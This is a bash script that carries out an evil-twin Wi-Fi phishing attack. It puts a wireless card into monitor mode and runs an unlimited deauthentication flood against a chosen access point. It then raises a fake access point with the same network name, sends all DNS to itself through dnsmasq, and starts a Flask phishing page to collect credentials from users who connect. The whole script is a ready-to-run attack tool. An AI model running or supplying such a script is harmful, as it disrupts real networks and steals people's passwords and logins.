#!/bin/bash
#WRITE THIS AFTER RUNNING!!!!
#sudo systemctl start systemd-resolved
#sudo systemctl unmask systemd-resolved
#sudo systemctl enable systemd-resolved
#sudo systemctl restart NetworkManager
trap ctrl_c_handler INT

ctrl_c_handler() {
    echo ""
    echo "[!] Ctrl+C detected! Cleaning up and exiting..."
    sudo python3 restore.py
    exit 1
}
read -p "What is your interface? (check with 'ip a/ifconfig') " IFACE

MONIFACE="${IFACE}mon"

echo "[+] Putting $IFACE into monitor mode..."
sudo airmon-ng start $IFACE
sleep 2

echo "[+] Scanning for nearby Wi-Fi networks,press CTRL+C to exit..."
sudo airodump-ng $MONIFACE
sleep 10

read -p "Enter BSSID of target AP: " BSSID
read -p "Enter Channel: " CH
read -p "Enter SSID (Wi-Fi name): " SSID

echo "[+] Starting deauth attack on $BSSID..."
gnome-terminal -- bash -c "
sudo airodump-ng --bssid $BSSID -c $CH $MONIFACE"
sleep 10

gnome-terminal -- bash -c "
sudo aireplay-ng --deauth 0 -a $BSSID $MONIFACE"
sleep 30

echo "[+] Exiting monitor mode..."
sudo airmon-ng stop $MONIFACE
sudo service NetworkManager restart
sleep 3

echo "[+] Disabling systemd-resolved pls activate them after!!!!(python3 restore.py)"
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved
sudo systemctl mask systemd-resolved


echo "[+] Writing hostapd config..."
cat > fakeap.conf <<EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CH
auth_algs=1
wmm_enabled=0
EOF

echo "[+] Writing dnsmasq config..."
cat > dnsmasq.conf <<EOF
interface=$IFACE
bind-interfaces
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
EOF

echo "[+] Configuring IP address for $IFACE..."
sudo ifconfig $IFACE up 192.168.1.1 netmask 255.255.255.0

echo "[+] Stopping system dnsmasq if running..."
sudo systemctl stop dnsmasq
sudo pkill dnsmasq

echo "[+] Starting dnsmasq DHCP/DNS server..."
sudo dnsmasq -C dnsmasq.conf

echo "[+] Starting phishing page server (Flask)..."
gnome-terminal -- bash -c "
source venv/bin/activate;
sudo python3 server.py;
exec bash"

echo "[+] Starting fake AP..."
sudo hostapd fakeap.conf
